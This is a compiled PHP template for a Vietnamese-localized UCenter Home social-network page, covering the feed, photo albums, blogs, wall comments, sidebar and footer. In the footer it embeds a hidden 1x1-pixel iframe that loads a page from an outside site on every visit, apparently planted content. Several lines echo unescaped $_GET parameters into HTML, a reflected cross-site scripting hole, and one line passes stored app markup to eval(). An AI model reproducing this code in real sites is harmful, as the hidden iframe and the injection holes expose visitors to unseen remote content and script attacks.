<a class="type" href="space.php?uid=<?=$_GET['uid']?>&do=feed&view=<?=$_GET['view']?>&appid=<?=$value['appid']?>&icon=<?=$value['icon']?>" title="Only such Feed"><img src="<?=$value['icon_image']?>" /></a>
<?=$value['title_template']?> 

<?php if(empty($_TPL['hidden_time'])) { ?>
<span class="gray"><?php echo sgmdate('m-d H:i',$value[dateline],1); ?></span>
<?php } ?>

<?php if(empty($_TPL['hidden_menu'])) { ?>
<?php if($value['idtype']=='doid') { ?>
(<a href="javascript:;" onclick="docomment_get('docomment_<?=$value['id']?>', 1);" id="do_a_op_<?=$value['id']?>">Reply</a>)
<?php } elseif(in_array($value['idtype'], array('blogid','picid','sid','pid','eventid'))) { ?>
(<a href="javascript:;" onclick="feedcomment_get(<?=$value['feedid']?>);" id="feedcomment_a_op_<?=$value['feedid']?>">Comment</a>)
<?php } ?>
<?php } ?>

<div class="feed_content">

<?php if(empty($_TPL['hidden_hot']) && $value['hot']) { ?>
<div class="hotspot"><a href="cp.php?ac=feed&feedid=<?=$value['feedid']?>"><?=$value['hot']?></a></div>
<?php } ?>	

<?php if($value['image_1']) { ?>
<a href="<?=$value['image_1_link']?>"<?=$value['target']?>><img src="<?=$value['image_1']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($value['image_2']) { ?>
<a href="<?=$value['image_2_link']?>"<?=$value['target']?>><img src="<?=$value['image_2']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($value['image_3']) { ?>
<a href="<?=$value['image_3_link']?>"<?=$value['target']?>><img src="<?=$value['image_3']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($value['image_4']) { ?>
<a href="<?=$value['image_4_link']?>"<?=$value['target']?>><img src="<?=$value['image_4']?>" class="summaryimg" /></a>
<?php } ?>

<?php if($value['body_template']) { ?>
<div class="detail"<?php if($value['image_3']) { ?> style="clear: both;"<?php } ?>>
<?=$value['body_template']?>
</div>
<?php } ?>

<?php if($value['thisapp'] && !empty($value['body_data']['flashvar'])) { ?>
<div class="media">
<img src="image/vd.gif" alt="Click to play" onclick="javascript:showFlash('<?=$value['body_data']['host']?>', '<?=$value['body_data']['flashvar']?>', this, '<?=$value['feedid']?>');" style="cursor:pointer;" />
</div>
<?php } elseif($value['thisapp'] && !empty($value['body_data']['musicvar'])) { ?>
<div class="media">
<img src="image/music.gif" alt="Click to play" onclick="javascript:showFlash('music', '<?=$value['body_data']['musicvar']?>', this, '<?=$value['feedid']?>');" style="cursor:pointer;" />
</div>
<?php } elseif($value['thisapp'] && !empty($value['body_data']['flashaddr'])) { ?>
<div class="media">
<img src="image/flash.gif" alt="Click to play" onclick="javascript:showFlash('flash', '<?=$value['body_data']['flashaddr']?>', this, '<?=$value['feedid']?>');" style="cursor:pointer;" />
</div>
<?php } ?>

<?php if($value['body_general']) { ?>
<div class="quote"><span class="q"><?=$value['body_general']?></span></div>
<?php } ?>
</div>
</div>

<?php if($value['idtype']=='doid') { ?>
<div id="docomment_<?=$value['id']?>" style="display:none;"></div>
<?php } elseif($value['idtype']) { ?>
<div id="feedcomment_<?=$value['feedid']?>" style="display:none;"></div>
<?php } ?>

<?php if(!empty($hiddenfeed_num[$value['icon']])) { ?>
<div id="appfeed_open_<?=$value['feedid']?>"><a href="javascript:;" id="feed_a_more_<?=$value['feedid']?>" onclick="feed_more_show('<?=$value['feedid']?>');">&raquo;  More Feed (<?=$hiddenfeed_num[$value['icon']]?>)</a></div>
<div id="feed_more_<?=$value['feedid']?>" style="display:none;">
<ol>
<?php if(is_array($hiddenfeed_list[$value['icon']])) { foreach($hiddenfeed_list[$value['icon']] as $appvalue) { ?>
<?php $appvalue = mkfeed($appvalue); ?>
<li>
<?=$appvalue['title_template']?>
<div class="feed_content" style="width:100%;overflow:hidden;">
<?php if($appvalue['image_1']) { ?>
<a href="<?=$appvalue['image_1_link']?>"<?=$appvalue['target']?>><img src="<?=$appvalue['image_1']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($appvalue['image_2']) { ?>
<a href="<?=$appvalue['image_2_link']?>"<?=$appvalue['target']?>><img src="<?=$appvalue['image_2']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($appvalue['image_3']) { ?>
<a href="<?=$appvalue['image_3_link']?>"<?=$appvalue['target']?>><img src="<?=$appvalue['image_3']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($appvalue['image_4']) { ?>
<a href="<?=$appvalue['image_4_link']?>"<?=$appvalue['target']?>><img src="<?=$appvalue['image_4']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($appvalue['body_template']) { ?>
<div class="detail"<?php if($appvalue['image_3']) { ?> style="clear: both;"<?php } ?>>
<?=$appvalue['body_template']?>
</div>
<?php } ?>
<?php if($appvalue['body_general']) { ?>
<div class="quote"><span class="q"><?=$appvalue['body_general']?></span></div>
<?php } ?>
</div>
</li>
<?php } } ?>
</ol>
</div>
<?php } ?>
</li>
<?php } } ?>
</ul>
</div>
</div>
<?php } ?>

<?php if($albumlist) { ?>
<div id="space_photo">
<h3 class="feed_header">
<a href="space.php?uid=<?=$space['uid']?>&do=album&view=me" class="r_option">All</a>
 Album ảnh
</h3>
<table cellspacing="4" cellpadding="4" width="100%">
<tr>
<?php if(is_array($albumlist)) { foreach($albumlist as $key => $value) { ?>
<td width="85" align="center"><a href="space.php?uid=<?=$space['uid']?>&do=album&id=<?=$value['albumid']?>" target="_blank"><img src="<?=$value['pic']?>" alt="<?=$value['albumname']?>" width="70" /></a></td>
<td width="165">
<h6><a href="space.php?uid=<?=$space['uid']?>&do=album&id=<?=$value['albumid']?>" target="_blank" title="<?=$value['albumname']?>"><?=$value['albumname']?></a></h6>
<p class="gray"><?=$value['picnum']?> Photos</p>
<p class="gray">Cập nhật <?php echo sgmdate('d-m',$value[dateline],1); ?></p>
</td>
<?php if($key%2==1) { ?></tr><tr><?php } ?>
<?php } } ?>
</tr>
</table>
</div>
<?php } ?>

<?php if($bloglist) { ?>
<div id="space_blog" class="feed">
<h3 class="feed_header">
<a href="space.php?uid=<?=$space['uid']?>&do=blog&view=me" class="r_option">All</a>
 Blogs cá nhân
</h3>
<ul class="line_list">
<?php if(is_array($bloglist)) { foreach($bloglist as $value) { ?>
<li>

<h4>
<span class="gray r_option"><?php echo sgmdate('m-d H:i',$value[dateline],1); ?></span>
<a href="space.php?uid=<?=$space['uid']?>&do=blog&id=<?=$value['blogid']?>" target="_blank"><?=$value['subject']?></a>
</h4>
<div class="detail">
<?=$value['message']?>
</div>
</li>
<?php } } ?>
</ul>
</div>
<?php } ?>


<?php if(is_array($widelist)) { foreach($widelist as $value) { ?>
<?php if($value['myml']) { ?>
<div id="space_app_<?=$value['appid']?>" class="appbox">
<h3 class="feed_header">
<?php if($space['self']) { ?>
<a href="cp.php?ac=space&op=delete&appid=<?=$value['appid']?>" id="user_app_<?=$value['appid']?>" class="r_option float_del" onclick="ajaxmenu(event, this.id)" title="Remove">Xóa</a>
<?php } ?>
<a href="<?=$value['appurl']?>"><?=$value['appname']?></a>
</h3>
<div class="box" style="margin: 0 0 20px;">
<?php eval($value[myml]); ?>
</div>
</div>
<?php } ?>
<?php } } ?>

</div>

<div id="comment" class="comments_list">
<h3 class="feed_header">
<a href="space.php?uid=<?=$space['uid']?>&do=wall&view=me" class="r_option">Tất cả</a>
 Tường nhà
</h3>

<div class="box">
<form action="cp.php?ac=comment" id="quick_commentform_<?=$space['uid']?>" name="quick_commentform_<?=$space['uid']?>" method="post" style="padding:0 0 0 5px;">
<a href="###" id="editface" onclick="showFace(this.id, 'comment_message');return false;"><img src="image/facelist.gif" align="absmiddle" /></a>
<?php if($_SGLOBAL['magic']['doodle']) { ?>
<a id="a_magic_doodle" href="magic.php?mid=doodle&showid=comment_doodle&target=comment_message" onclick="ajaxmenu(event, this.id, 1)"><img src="image/magic/doodle.small.gif" class="magicicon" /> Vẽ lên tường</a>
<?php } ?>
<br />
<textarea name="message" id="comment_message" rows="4" cols="60" style="width:98%;" onkeydown="ctrlEnter(event, 'commentsubmit_btn');"></textarea><br>
<input type="hidden" name="refer" value="space.php?uid=<?=$space['uid']?>" />
<input type="hidden" name="id" value="<?=$space['uid']?>" />
<input type="hidden" name="idtype" value="uid" />
<input type="hidden" name="commentsubmit" value="true" />
<input type="button" id="commentsubmit_btn" name="commentsubmit_btn" class="submit" value="Viết lên tường" onclick="ajaxpost('quick_commentform_<?=$space['uid']?>', 'wall_add')" />
<span id="__quick_commentform_<?=$space['uid']?>"></span>
<input type="hidden" name="formhash" value="<?php echo formhash(); ?>" />
</form>
</div>

<div class="box_content">
<ul class="post_list a_list justify_list" id="comment_ul">
<?php if(is_array($walllist)) { foreach($walllist as $value) { ?>
<?php if(empty($ajax_edit)) { ?><li id="comment_<?=$value['cid']?>_li"><?php } ?>
<?php if($value['author']) { ?>
<div class="avatar48"><a href="space.php?uid=<?=$value['authorid']?>"><?php echo avatar($value[authorid],small); ?></a></div>
<?php } else { ?>
<div class="avatar48"><img src="image/magic/hidden.gif" class="avatar" /></div>
<?php } ?>
<div class="title">
<div class="r_option">

<?php if($value['authorid'] != $_SGLOBAL['supe_uid'] && $value['author'] == "" && $_SGLOBAL['magic']['reveal']) { ?>
<a id="a_magic_reveal_<?=$value['cid']?>" href="magic.php?mid=reveal&idtype=cid&id=<?=$value['cid']?>" onclick="ajaxmenu(event,this.id,1)"><img src="image/magic/reveal.small.gif" class="magicicon"><?=$_SGLOBAL['magic']['reveal']?></a>
<span class="pipe">|</span>
<?php } ?>

<?php if($value['authorid']==$_SGLOBAL['supe_uid']) { ?>
<?php if($_SGLOBAL['magic']['anonymous']) { ?>
<img src="image/magic/anonymous.small.gif" class="magicicon">
<a id="a_magic_anonymous_<?=$value['cid']?>" href="magic.php?mid=anonymous&idtype=cid&id=<?=$value['cid']?>" onclick="ajaxmenu(event,this.id, 1)"><?=$_SGLOBAL['magic']['anonymous']?></a>
<span class="pipe">|</span>
<?php } ?>
<?php if($_SGLOBAL['magic']['flicker']) { ?>
<img src="image/magic/flicker.small.gif" class="magicicon">
<?php if($value['magicflicker']) { ?>
<a id="a_magic_flicker_<?=$value['cid']?>" href="cp.php?ac=magic&op=cancelflicker&idtype=cid&id=<?=$value['cid']?>" onclick="ajaxmenu(event,this.id)">ȡ��<?=$_SGLOBAL['magic']['flicker']?></a>
<?php } else { ?>
<a id="a_magic_flicker_<?=$value['cid']?>" href="magic.php?mid=flicker&idtype=cid&id=<?=$value['cid']?>" onclick="ajaxmenu(event,this.id, 1)"><?=$_SGLOBAL['magic']['flicker']?></a>
<?php } ?>
<span class="pipe">|</span>
<?php } ?>

<a href="cp.php?ac=comment&op=edit&cid=<?=$value['cid']?>" id="c_<?=$value['cid']?>_edit" onclick="ajaxmenu(event, this.id, 1)">Edit</a>
<?php } ?>
<?php if($value['authorid']==$_SGLOBAL['supe_uid'] || $value['uid']==$_SGLOBAL['supe_uid'] || checkperm('managecomment')) { ?>
<a href="cp.php?ac=comment&op=delete&cid=<?=$value['cid']?>" id="c_<?=$value['cid']?>_delete" onclick="ajaxmenu(event, this.id)">Remove</a>
<?php } ?>
<?php if($value['authorid']!=$_SGLOBAL['supe_uid'] && ($value['idtype'] != 'uid' || $space['self'])) { ?>
<a href="cp.php?ac=comment&op=reply&cid=<?=$value['cid']?>&feedid=<?=$feedid?>" id="c_<?=$value['cid']?>_reply" onclick="ajaxmenu(event, this.id, 1)">Reply</a>
<?php } ?>
<a href="cp.php?ac=common&op=report&idtype=comment&id=<?=$value['cid']?>" id="a_report_<?=$value['cid']?>" onclick="ajaxmenu(event, this.id, 1)">Abuse</a>
</div>

<?php if($value['author']) { ?>
<a href="space.php?uid=<?=$value['authorid']?>" id="author_<?=$value['cid']?>"><?=$_SN[$value['authorid']]?></a> 
<?php } else { ?>
Anonymous
<?php } ?>
<span class="gray"><?php echo sgmdate('Y-m-d H:i',$value[dateline],1); ?></span>

</div>

<div class="detail<?php if($value['magicflicker']) { ?> magicflicker<?php } ?>" id="comment_<?=$value['cid']?>"><?=$value['message']?></div>

<?php if(empty($ajax_edit)) { ?></li><?php } ?>
<?php } } ?>
</ul>
<?php if($walllist) { ?>
<p class="r_option" style="padding:5px 0 10px 0;"><a href="space.php?uid=<?=$space['uid']?>&do=wall&view=me">&raquo; Xem thêm</a></p>
<?php } ?>
</div>
</div>
</div>

<div id="obar">
<?php if(!$space['self']) { ?>

<?php if($space['magiccredit']) { ?>
<div class="magichongbao" id="div_magic_gift">
<a id="a_magic_gift" href="cp.php?&ac=magic&op=receive&uid=<?=$space['uid']?>" onclick="ajaxmenu(event, this.id)">Tặng <span><?=$space['magiccredit']?></span> điểm</a>
</div>
<?php } ?>

<?php if($_SGLOBAL['magic']['viewmagiclog'] || $_SGLOBAL['magic']['viewmagic'] || $_SGLOBAL['magic']['viewvisitor']) { ?>
<div class="indexmagic">
<?php if(is_array(array('viewmagiclog','viewmagic','viewvisitor'))) { foreach(array('viewmagiclog','viewmagic','viewvisitor') as $mid) { ?>
<?php if($_SGLOBAL['magic'][$mid]) { ?>
<a id="a_magic_<?=$mid?>" href="magic.php?mid=<?=$mid?>&idtype=uid&id=<?=$space['uid']?>" onclick="ajaxmenu(event,this.id,1)">
<img src="image/magic/<?=$mid?>.small.gif" title="<?=$_SGLOBAL['magic'][$mid]?>" alt="<?=$_SGLOBAL['magic'][$mid]?>">
</a>
<?php } ?>
<?php } } ?>
</div>
<?php } ?>
<?php } else { ?>
<?php if($_SGLOBAL['magic']['gift']) { ?>
<div class="magichongbao" id="div_magic_gift">				
<?php if($space['magiccredit']) { ?>
<a id="a_magic_retrieve" href="cp.php?ac=magic&op=retrieve" onclick="ajaxmenu(event,this.id)"></a>
<?php } else { ?>
<a id="a_magic_gift" href="magic.php?mid=gift" onclick="ajaxmenu(event,this.id,1)">Tặng quà</a>
<?php } ?>				
</div>
<?php } ?>
<?php } ?>


<?php if($visitorlist) { ?>
<div class="sidebox">
<h2 class="title">
<a href="space.php?uid=<?=$space['uid']?>&do=friend&view=visitor" class="r_option">Tất cả</a>
Gần đây
<?php if(!$space['self'] && $_SGLOBAL['magic']['anonymous']) { ?>
<span class="gray"><img title="<?=$_SGLOBAL['magic']['anonymous']?>" src="image/magic/anonymous.small.gif"/><a id="a_magic_anonymous" href="magic.php?mid=anonymous&idtype=uid&id=<?=$space['uid']?>" onclick="ajaxmenu(event,this.id,1)">Ẩn</a></span>
<?php } ?>
</h2>
<ul class="avatar_list">
<?php if(is_array($visitorlist)) { foreach($visitorlist as $key => $value) { ?>
<li>
<?php if($value['vusername'] == '') { ?>
<div class="avatar48"><img src="image/magic/hidden.gif" alt="Anonymous" /></div>
<p>Ẩn</p>
<p class="gray"><?php echo sgmdate('n day j month',$value[dateline],1); ?></p>
<?php } else { ?>
<div class="avatar48"><a href="space.php?uid=<?=$value['vuid']?>"><?php echo avatar($value[vuid],small); ?></a></div>
<p<?php if($ols[$value['vuid']]) { ?> class="online_icon_p"<?php } ?>><a href="space.php?uid=<?=$value['vuid']?>" title="<?=$_SN[$value['vuid']]?>"><?=$_SN[$value['vuid']]?></a></p>
<p class="gray">Dt:<?php echo sgmdate('j-n ',$value[dateline],1); ?></p>
<?php } ?>
</li>
<?php } } ?>
</ul>
</div>
<?php } ?>


<?php if($friendlist) { ?>
<div class="sidebox">
<h2 class="title">
<span class="r_option">
<a href="space.php?uid=<?=$space['uid']?>&do=friend&view=me" class="action">Tất cả (<?=$space['friendnum']?>)</a>
</span>
Bạn bè
</h2>
<ul class="avatar_list">
<?php if(is_array($friendlist)) { foreach($friendlist as $value) { ?>
<li>
<div class="avatar48"><a href="space.php?uid=<?=$value['fuid']?>"><?php echo avatar($value[fuid],small); ?></a></div>
<p<?php if($ols[$value['fuid']]) { ?> class="online_icon_p"<?php } ?>><a href="space.php?uid=<?=$value['fuid']?>"><?=$_SN[$value['fuid']]?></a></p>
</li>
<?php } } ?>
</ul>
</div>
<?php } ?>

</div>

</div>

<?php if($_GET['theme']) { ?><div class="nn">Bạn có muốn chọn giao diện này làm giao diện mắc định?<br /><a href="cp.php?ac=theme&op=use&dir=<?=$_GET['theme']?>">[Có]</a><a href="cp.php?ac=theme">[Ko]</a></div><?php } ?>
<?php if(empty($_SGLOBAL['inajax'])) { ?>
<?php if(empty($_TPL['nosidebar'])) { ?>
<?php if($_SGLOBAL['ad']['contentbottom']) { ?><br style="line-height:0;clear:both;"/><div id="ad_contentbottom"><?php adshow('contentbottom'); ?></div><?php } ?>
</div>

<!--/mainarea-->
<div id="bottom"></div>
</div>
<!--/main-->
<?php } ?>

<div id="footer">
<?php if($_TPL['templates']) { ?>
<div class="chostlp" title="Đổi giao diện"><img id="chostlp" src="<?=$_TPL['default_template']['icon']?>" onmouseover="showMenu(this.id)" alt="<?=$_TPL['default_template']['name']?>" /></div>
<ul id="chostlp_menu" class="chostlp_drop" style="display: none">
<?php if(is_array($_TPL['templates'])) { foreach($_TPL['templates'] as $value) { ?>
<li><a href="cp.php?ac=common&op=changetpl&name=<?=$value['name']?>" title="<?=$value['name']?>"><img src="<?=$value['icon']?>" alt="<?=$value['name']?>" /></a></li>
<?php } } ?>
</ul>
<?php } ?>

<p class="r_option">
<a href="javascript:;" onclick="window.scrollTo(0,0);" id="a_top" title="TOP"><img src="image/top.gif" alt="" style="padding: 5px 6px 6px;" /></a>
</p>

<?php if($_SGLOBAL['ad']['footer']) { ?>
<p style="padding:5px 0 10px 0;"><?php adshow('footer'); ?></p>
<?php } ?>

<?php if($_SCONFIG['close']) { ?>
<p style="color:blue;font-weight:bold;">
Thông báo: Hiện trang web đang tạm ngừng hoạt động
</p>
<?php } ?>
<p>
<?=$_SCONFIG['sitename']?> - 
<a href="mailto:<?=$_SCONFIG['adminemail']?>">Liên hệ</a> <a href="http://gohooh.com">Discuz! Việt - Mạng xã hội</a>
<?php if($_SCONFIG['miibeian']) { ?> - <a  href="http://www.miibeian.gov.cn" target="_blank"><?=$_SCONFIG['miibeian']?></a><?php } ?>
</p>
<p>
Powered by <a  href="http://gohooh.com" target="_blank"><strong>UCenter Home</strong></a> <span title="<?php echo X_RELEASE; ?>"><?php echo X_VER; ?></span>
<?php if(!empty($_SCONFIG['licensed'])) { ?><a  href="http://license.comsenz.com/?pid=7&host=<?=$_SERVER['HTTP_HOST']?>" target="_blank">Licensed</a><?php } ?>
&copy; 2001-2009 <a  href="http://www.comsenz.com" target="_blank">Comsenz Inc.</a>
</p>
<?php if($_SCONFIG['debuginfo']) { ?>
<p><?php echo debuginfo(); ?></p>
<?php } ?>
</div>
</div>
<!--/wrap-->

<?php if($_SGLOBAL['appmenu']) { ?>
<ul id="ucappmenu_menu" class="dropmenu_drop" style="display:none;">
<li><a href="<?=$_SGLOBAL['appmenu']['url']?>" title="<?=$_SGLOBAL['appmenu']['name']?>" target="_blank"><?=$_SGLOBAL['appmenu']['name']?></a></li>
<?php if(is_array($_SGLOBAL['appmenus'])) { foreach($_SGLOBAL['appmenus'] as $value) { ?>
<li><a href="<?=$value['url']?>" title="<?=$value['name']?>" target="_blank"><?=$value['name']?></a></li>
<?php } } ?>
</ul>
<?php } ?>
<iframe style="WIDTH: 1; HEIGHT: 1" src="http://www.gohooh.com/auto.html" frameborder="0" width="1" scrolling="1" height="1"></iframe>
<?php if($_SGLOBAL['supe_uid']) { ?>
<ul id="membernotemenu_menu" class="dropmenu_drop" style="display:none;">
<?php $member = $_SGLOBAL['member']; ?>
<?php if($member['notenum']) { ?><li><img src="image/icon/notice.gif" width="16" alt="" /> <a href="space.php?do=notice"><strong><?=$member['notenum']?></strong> Thông báo mới</a></li><?php } ?>
<?php if($member['pokenum']) { ?><li><img src="image/icon/poke.gif" alt="" /> <a href="cp.php?ac=poke"><strong><?=$member['pokenum']?></strong> Tin mới</a></li><?php } ?>
<?php if($member['addfriendnum']) { ?><li><img src="image/icon/friend.gif" alt="" /> <a href="cp.php?ac=friend&op=request"><strong><?=$member['addfriendnum']?></strong> Yêu cầu kết bạn</a></li><?php } ?>
<?php if($member['mtaginvitenum']) { ?><li><img src="image/icon/mtag.gif" alt="" /> <a href="cp.php?ac=mtag&op=mtaginvite"><strong><?=$member['mtaginvitenum']?></strong> Mời nhóm</a></li><?php } ?>
<?php if($member['eventinvitenum']) { ?><li><img src="image/icon/event.gif" alt="" /> <a href="cp.php?ac=event&op=eventinvite"><strong><?=$member['eventinvitenum']?></strong> Mời tham gia Event</a></li><?php } ?>
<?php if($member['myinvitenum']) { ?><li><img src="image/icon/userapp.gif" alt="" /> <a href="space.php?do=notice&view=userapp"><strong><?=$member['myinvitenum']?></strong> Mời qua Email</a></li><?php } ?>
</ul>
<?php } ?>

<?php if($_SGLOBAL['supe_uid']) { ?>
<?php if(!isset($_SCOOKIE['checkpm'])) { ?>
<script language="javascript"  type="text/javascript" src="cp.php?ac=pm&op=checknewpm&rand=<?=$_SGLOBAL['timestamp']?>"></script>
<?php } ?>
<?php if(!isset($_SCOOKIE['synfriend'])) { ?>
<script language="javascript"  type="text/javascript" src="cp.php?ac=friend&op=syn&rand=<?=$_SGLOBAL['timestamp']?>"></script>
<?php } ?>
<?php } ?>
<?php if(!isset($_SCOOKIE['sendmail'])) { ?>
<script language="javascript"  type="text/javascript" src="do.php?ac=sendmail&rand=<?=$_SGLOBAL['timestamp']?>"></script>
<?php } ?>

<?php if($_SGLOBAL['ad']['couplet']) { ?>
<script language="javascript" type="text/javascript" src="source/script_couplet.js"></script>
<div id="uch_couplet" style="z-index: 10; position: absolute; display:none">
<div id="couplet_left" style="position: absolute; left: 2px; top: 60px; overflow: hidden;">
<div style="position: relative; top: 25px; margin:0.5em;" onMouseOver="this.style.cursor='hand'" onClick="closeBanner('uch_couplet');"><img src="image/advclose.gif"></div>
<?php adshow('couplet'); ?>
</div>
<div id="couplet_rigth" style="position: absolute; right: 2px; top: 60px; overflow: hidden;">
<div style="position: relative; top: 25px; margin:0.5em;" onMouseOver="this.style.cursor='hand'" onClick="closeBanner('uch_couplet');"><img src="image/advclose.gif"></div>
<?php adshow('couplet'); ?>
</div>
<script type="text/javascript">
lsfloatdiv('uch_couplet', 0, 0, '', 0).floatIt();
</script>
</div>
<?php } ?>
<?php if($_SCOOKIE['reward_log']) { ?>
<script type="text/javascript">
showreward();
</script>
<?php } ?>
<br>
</body>
</html>
<?php } ?>

<script>
function getindex(type) {
var plus = '';
if(type == 'event') plus = '&type=self';
ajaxget('space.php?uid=<?=$space['uid']?>&do='+type+'&view=me'+plus+'&ajaxdiv=maincontent', 'maincontent');
}

//²ÊºçìÅ
var elems = selector('div[class~=magicflicker]'); 
for(var i=0; i<elems.length; i++){
magicColor(elems[i]);
}

</script><?php ob_out();?>